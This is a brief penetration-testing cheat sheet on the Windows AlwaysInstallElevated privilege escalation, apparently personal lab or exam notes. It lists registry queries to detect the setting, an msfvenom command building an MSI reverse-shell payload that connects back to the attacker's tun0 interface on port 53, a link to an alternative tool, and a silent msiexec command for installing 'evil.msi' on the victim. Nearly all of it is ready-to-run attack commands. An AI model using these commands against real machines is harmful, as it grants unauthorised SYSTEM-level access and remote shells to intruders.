## AlwaysInstallElevated

- check from either winpeas or manual regkey enum
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
Msf's msi payload may not work
```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=53 -f msi -o reverse.msi 
```
Use this instead
https://github.com/KINGSABRI/MSI-AlwaysInstallElevated



Execution on victim
```
msiexec.exe /quiet /qn /i evil.msi
```